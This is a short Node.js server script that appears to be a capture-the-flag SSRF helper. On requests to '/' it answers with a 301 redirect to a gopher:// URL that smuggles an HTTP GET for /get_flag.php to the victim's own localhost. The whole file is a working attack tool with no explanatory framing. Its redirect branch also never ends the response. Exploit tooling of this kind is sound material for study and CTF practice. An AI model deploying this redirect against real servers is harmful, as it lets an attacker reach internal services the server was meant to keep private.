const http = require('http');

const server = http.createServer((req, res) => {
  if (req.url === '/') {
    // Encode a Gopher request that performs an HTTP GET to localhost/get_flag.php
    const gopherPayload = `GET /get_flag.php HTTP/1.1\r\nHost: localhost\r\n\r\n`;
    const gopherURL = `gopher://127.0.0.1:80/_${encodeURIComponent(gopherPayload)}`;

    // redirect to gopher URL
    console.log(`Redirecting ${req.ip} to: ${gopherURL}`);
    res.writeHead(301, { 'Location': gopherURL });

  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

// Start the server on port 3000
server.listen(3000, () => {
  console.log('Server running at port 3000');
});

